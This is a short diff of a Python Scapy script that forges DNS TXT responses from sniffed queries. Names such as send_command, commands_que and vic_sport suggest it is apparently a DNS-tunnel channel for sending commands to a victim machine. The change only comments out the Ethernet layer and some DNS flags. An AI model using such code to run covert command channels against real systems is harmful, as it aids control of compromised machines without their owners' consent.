@@ -20,10 +20,10 @@ def commands_input():
             print(commands_que)
             
 def build_p(packet,data):
-    eth = Ether(
-        src=packet[Ether].dst,
-        dst=packet[Ether].src
-        )
+    # eth = Ether(
+    #     src=packet[Ether].dst,
+    #     dst=packet[Ether].src
+    #     )
 
     # Construct the IP header by looking at the sniffed packet
     ip = IP(
@@ -41,22 +41,22 @@ def build_p(packet,data):
     dns = DNS(
         id=packet[DNS].id,
         qd=packet[DNS].qd,
-        aa=1,
-        rd=0,
-        qr=1,
-        qdcount=1,
-        ancount=1,
-        nscount=0,
-        arcount=0,
+        # aa=1,
+        # rd=0,
+        # qr=1,
+        # qdcount=1,
+        # ancount=1,
+        # nscount=0,
+        # arcount=0,
         an=DNSRR(
             rrname=packet[DNS].qd.qname,
             type='TXT',
-            ttl=0,
+            #ttl=0,
             rdata=data)
         )
 
     # Put the full packet together
-    response_packet = eth / ip / udp / dns
+    response_packet = ip / udp / dns
     return response_packet
 
 def send_command(ip_adr,vic_sport,get_qname,packet):
